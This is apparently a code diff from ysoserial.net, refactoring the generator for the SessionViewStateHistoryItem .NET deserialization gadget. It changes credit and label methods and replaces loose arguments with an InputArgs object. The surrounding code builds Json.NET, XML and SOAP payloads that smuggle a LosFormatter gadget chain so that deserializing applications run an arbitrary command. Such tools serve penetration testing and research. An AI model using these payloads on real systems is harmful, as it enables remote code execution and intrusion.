@@ -32,16 +32,15 @@ namespace ysoserial.Generators
             return "SessionViewStateHistoryItem";
         }
 
-        public override string Credit()
+        public override string Finders()
         {
             return "Soroush Dalili";
         }
 
-        public override bool isDerived()
+        public override List<string> Labels()
         {
-            return true;
+            return new List<string> { GadgetTypes.BridgeAndDerived };
         }
-
 
         [Serializable]
         public class SessionViewStateHistoryItemMarshal : ISerializable
@@ -72,24 +71,24 @@ namespace ysoserial.Generators
             return b64SessionTokenMatch.Groups[1].Value;
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
+        public override object Generate(string formatter, InputArgs inputArgs)
         {
             Generator generator = new TextFormattingRunPropertiesGenerator();
-            string losFormatterText = Encoding.UTF8.GetString((byte[])generator.Generate(cmd, "LosFormatter", false, minify, useSimpleType));
+            string losFormatterText = Encoding.UTF8.GetString((byte[])generator.GenerateWithNoTest("LosFormatter", inputArgs));
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase))
             {
                 var obj = new SessionViewStateHistoryItemMarshal(losFormatterText);
-                return Serialize(obj, formatter, test, minify, useSimpleType);
+                return Serialize(obj, formatter, inputArgs);
             }
             else if (formatter.ToLower().Equals("json.net"))
             {
 
                 string payload = "{'$type': 'System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a', 's':'" + GetB64SessionToken(losFormatterText) + "'}";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     // by default JsonSerializerSettings.TypeNameAssemblyFormat is set to Simple so we can remove the version etc from the assembly name
                     // see https://www.newtonsoft.com/json/help/html/P_Newtonsoft_Json_JsonSerializerSettings_TypeNameAssemblyFormat.htm
@@ -98,7 +97,7 @@ namespace ysoserial.Generators
                 }
 
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -117,12 +116,12 @@ namespace ysoserial.Generators
   <s i:type=""x:string"" xmlns="""">{GetB64SessionToken(losFormatterText)}</s>
 </SessionViewState.SessionViewStateHistoryItem></root>";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = XMLMinifier.Minify(payload, null, null);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -141,12 +140,12 @@ namespace ysoserial.Generators
   <s z:Type=""System.String"" z:Assembly=""0"" xmlns="""">{GetB64SessionToken(losFormatterText)}</s>
 </w></root>";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = XMLMinifier.Minify(payload, null, null);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -170,12 +169,12 @@ namespace ysoserial.Generators
 </SOAP-ENV:Envelope>
 ";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = XMLMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
